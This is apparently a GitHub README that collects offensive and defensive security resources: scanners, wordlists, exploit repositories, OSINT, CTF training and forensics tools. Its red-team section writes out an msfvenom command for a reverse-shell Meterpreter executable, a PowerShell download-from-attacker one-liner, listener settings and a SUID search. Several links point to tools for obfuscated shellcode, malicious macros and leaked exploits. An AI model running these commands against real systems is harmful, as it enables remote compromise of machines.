# TI-Collection
Wide collection of tools, links, informations

## Tools & Scripts
### Scanning
**Nmap Script Collection**
- https://github.com/emadshanab/Nmap-NSE-scripts-collection

### Lists
**Web**
- https://github.com/emadshanab/Huge_DIR_wordlist
- https://github.com/emadshanab/subs_all
- https://github.com/emadshanab/WordLists-20111129
- http://wordlists.assetnote.io/

### Red
**Online Reverse Shell generator**
- https://www.revshells.com/


*Create Payload with MSFVenom*
  msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

*Upload Payload via PS & Fileserver*
  powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

*Open Meterpreter listener*
  use exploit/multi/handler 
  set PAYLOAD windows/meterpreter/reverse_tcp 
  set LHOST your-ip 
  set LPORT listening-port 
  run
  
* Start Process*
  Start-Process "shell-name.exe"
  
  *Spawn webserver*
  python3 -m http.server [PORT]
  
  *Search for SUID Files*
  To look for the files with SUID permission we can use the command:
find / -type f -user root -perm -4000 2>/dev/null

**Don't kill my cat** 
A tool that generates obfuscated shellcode that is stored inside of polyglot images. 
- https://github.com/Mr-Un1k0d3r/DKMC


**Malicious Macro Generator Utility**
Simple utility design to generate obfuscated macro that also include a AV / Sandboxes escape mechanism.
- https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator

**Information about EDRs that can be useful during red team exercise like hooked DLLs etc.**
- https://github.com/Mr-Un1k0d3r/EDRs

**Vulnx** is An Intelligent Bot Auto Shell Injector that detects vulnerabilities in multiple types of Cms
- https://github.com/anouarbensaad/vulnx

**Privilege Escalations**
  - Windows: https://lolbas-project.github.io/
  - Linux: https://gtfobins.github.io/

## PoCs & Exploits
**ShadowBroker Exploits & Tools**
- https://github.com/misterch0c/shadowbroker

**Wifi Fragattacks**
- https://github.com/vanhoefm/fragattacks

## OSINT
The **xCyclopedia** project attempts to document all executable binaries (and eventually scripts) that reside on a typical operating system. It provides a web page to view the data as well as a machine-readable format (JSON and CSV) that can be immediately usable in other systems such as SIEMs to enrich observed executions with contextual data.
- https://strontic.github.io/xcyclopedia/

**CyberChef**
- https://gchq.github.io/CyberChef/

**CyberChef Recipes**
- https://github.com/mattnotmax/cyberchef-recipes

# Trainings & Education

## Challenges
**CTFchallenge** is a collection of 12 vulnerable web applications, each one has its own realistic infrastructure built over several subdomains containing vulnerabilities based on bug reports, real world experiences or vulnerabilities found in the OWASP Top 10.
- https://ctfchallenge.com/


## Trainings

- https://0xdarkvortex.dev/

## Cheat Sheets

### Privilege Escelation
Cheatsheet aimed at CTF Players and Beginners to help them understand the fundamentals of Privilege Escalation with examples.
- https://github.com/Ignitetechnologies/Privilege-Escalation

# Forensics
## Data Analytics
**PcapXray**
A Network Forensics Tool - To visualize a Packet Capture offline as a Network Diagram including device identification, highlight important communication and file extraction
- https://github.com/Srinivas11789/PcapXray

